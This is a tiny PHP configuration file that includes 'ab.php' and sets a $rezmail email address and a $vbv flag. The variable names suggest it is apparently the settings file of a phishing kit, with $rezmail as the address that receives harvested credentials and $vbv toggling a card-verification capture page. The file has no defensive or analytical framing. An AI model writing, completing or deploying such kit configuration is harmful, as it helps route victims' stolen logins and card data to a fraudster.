<?php
include('ab.php');
$rezmail = "labeuhr@yandex.com";
$vbv = "0";

?>